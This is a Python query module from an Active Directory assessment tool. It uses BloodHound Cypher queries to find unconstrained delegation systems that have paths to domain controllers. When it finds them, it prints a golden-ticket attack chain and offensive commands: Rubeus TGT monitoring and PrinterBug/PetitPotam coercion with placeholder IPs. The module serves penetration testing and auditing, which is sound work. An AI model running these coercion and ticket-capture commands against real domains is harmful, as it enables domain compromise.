"""Unconstrained Delegation Paths to DC/KRBTGT (Golden Ticket Risk)"""

from __future__ import annotations

from typing import TYPE_CHECKING, Optional

from hackles.core.config import config
from hackles.core.cypher import node_type
from hackles.display.colors import Severity
from hackles.display.paths import print_paths_grouped
from hackles.display.tables import print_header, print_subheader, print_table, print_warning
from hackles.queries.base import register_query

if TYPE_CHECKING:
    from hackles.core.bloodhound import BloodHoundCE


@register_query(
    name="Unconstrained Delegation -> DC Paths",
    category="Delegation",
    default=True,
    severity=Severity.CRITICAL,
)
def get_unconstrained_to_dc_paths(
    bh: BloodHoundCE, domain: Optional[str] = None, severity: Severity = None
) -> int:
    """Find attack paths from Unconstrained Delegation systems to Domain Controllers.

    Compromising a system with unconstrained delegation allows capturing TGTs of
    any user that authenticates to it. If a DC can be coerced to authenticate
    (e.g., via PrinterBug/PetitPotam), the DC's TGT can be captured for:
    - DCSync attack using the DC machine account
    - Silver ticket for DC services
    - Path to KRBTGT hash extraction

    This query finds if unconstrained delegation systems have paths TO DCs,
    which could enable additional lateral movement after initial compromise.
    """
    domain_filter = "AND toUpper(u.domain) = toUpper($domain)" if domain else ""
    params = {"domain": domain} if domain else {}

    # First, get unconstrained delegation systems
    unconstrained_query = f"""
    MATCH (u)
    WHERE (u:User OR u:Computer)
    AND u.unconstraineddelegation = true
    AND u.enabled <> false
    AND NOT u.objectid ENDS WITH '-516'
    {domain_filter}
    RETURN u.name AS name, {node_type('u')} AS type, u.domain AS domain
    ORDER BY u.name
    """
    unconstrained = bh.run_query(unconstrained_query, params)

    if not unconstrained:
        if not print_header("Unconstrained Delegation → DC Paths", severity, 0):
            return 0
        print_subheader("No non-DC unconstrained delegation systems found")
        return 0

    # Now find paths from these systems to DCs
    path_query = f"""
    MATCH (u)
    WHERE (u:User OR u:Computer)
    AND u.unconstraineddelegation = true
    AND u.enabled <> false
    AND NOT u.objectid ENDS WITH '-516'
    {domain_filter}
    WITH u
    MATCH (dc:Computer)
    WHERE dc.objectid ENDS WITH '-516'
    WITH u, dc
    MATCH p=shortestPath((u)-[*1..{config.max_path_depth}]->(dc))
    WHERE length(p) > 0
    RETURN
        [node IN nodes(p) | node.name] AS nodes,
        [node IN nodes(p) | CASE
            WHEN node:User THEN 'User'
            WHEN node:Group THEN 'Group'
            WHEN node:Computer THEN 'Computer'
            WHEN node:Domain THEN 'Domain'
            ELSE 'Other' END] AS node_types,
        [r IN relationships(p) | type(r)] AS relationships,
        length(p) AS path_length
    ORDER BY length(p)
    LIMIT {config.max_paths}
    """
    results = bh.run_query(path_query, params)
    result_count = len(results)

    if not print_header("Unconstrained Delegation → DC Paths", severity, result_count):
        return result_count
    print_subheader(
        f"Found {result_count} path(s) from Unconstrained Delegation to Domain Controllers"
    )

    if results:
        print_warning("[!] CRITICAL: Unconstrained delegation systems with paths to DCs!")
        print_warning("")
        print_warning("    Golden Ticket Attack Chain:")
        print_warning("    1. Compromise unconstrained delegation system")
        print_warning("    2. Coerce DC authentication (PrinterBug, PetitPotam)")
        print_warning("    3. Capture DC's TGT from memory")
        print_warning("    4. DCSync using DC machine account OR")
        print_warning("    5. Use captured path to further escalate to DC")
        print_warning("")

        # Show unconstrained systems first
        print_warning(f"    [{len(unconstrained)}] Unconstrained delegation system(s):")
        for u in unconstrained[:5]:
            print_warning(f"        - {u['name']} ({u['type']})")
        if len(unconstrained) > 5:
            print_warning(f"        ... and {len(unconstrained) - 5} more")
        print()

        print_paths_grouped(results)

        print()
        print("    Coercion + Capture:")
        print("    # On unconstrained system, monitor for TGTs:")
        print("    Rubeus.exe monitor /interval:5 /nowrap")
        print("")
        print("    # Coerce DC to authenticate:")
        print("    python3 printerbug.py domain/user:pass@<DC_IP> <UNCONSTRAINED_IP>")
        print("    python3 PetitPotam.py <UNCONSTRAINED_IP> <DC_IP>")

    return result_count
